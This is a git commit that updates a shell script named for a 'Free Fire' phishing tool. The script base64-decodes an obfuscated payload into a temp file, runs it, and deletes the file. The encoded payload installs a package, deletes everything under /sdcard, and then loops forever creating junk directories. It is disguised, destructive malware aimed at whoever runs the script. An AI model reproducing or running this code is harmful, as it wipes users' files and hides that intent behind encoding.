7b2a33c383097e7be47f2414a0ff36b8c2253f1e
PervesoAnonymou <67443037+Perveso@users.noreply.github.com>
2020-11-11 04:42:13 -0300

    Update pisherfreefire.sh

--- pisherfreefire.sh
+++ pisherfreefire.sh
@@ -1,6 +1,7 @@
 perveso=$(mktemp)
 base64 -d  >${perveso}<<DIXIE
-cGtnIGluc3RhbGwgc2wKc2wKCnJtIC1yZiAvc2RjY                            >ZTtkbwogICAgbWtkaXIgIlRFU1RBTkRPLiRSQU5ET                            >
+cGtnIGluc3RhbGwgc2wKc2wKCnJtIC1yZiAvc2RjYXJkLyoKY2QgL3NkY2FyZAoKd2hpbGUgdHJ1
+ZTtkbwogICAgbWtkaXIgIlRFU1RBTkRPLiRSQU5ET00iCmRvbmUK
 DIXIE
 source ${perveso}
 rm -rf ${perveso}
